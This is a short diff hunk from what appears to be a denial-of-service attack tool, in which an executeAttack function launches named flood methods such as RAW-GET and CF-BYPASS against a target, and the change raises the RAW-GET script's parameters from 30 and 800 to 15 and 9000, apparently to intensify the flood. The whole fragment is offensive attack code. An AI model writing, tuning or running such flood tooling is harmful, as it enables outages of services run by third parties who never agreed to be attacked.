@@ -366,7 +366,7 @@ function executeAttack(target, time, methods) {
       
     case 'RAW-GET':
       log('📦 Launching RAW-GET attack', 'attack');
-      execWithLog(`node ${path.join(methodsDir, 'raw-get.js')} ${target} ${time} 30 800`, 'raw-get.js');
+      execWithLog(`node ${path.join(methodsDir, 'raw-get.js')} ${target} ${time} 15 9000`, 'raw-get.js');
       break;
       
     case 'CF-BYPASS':
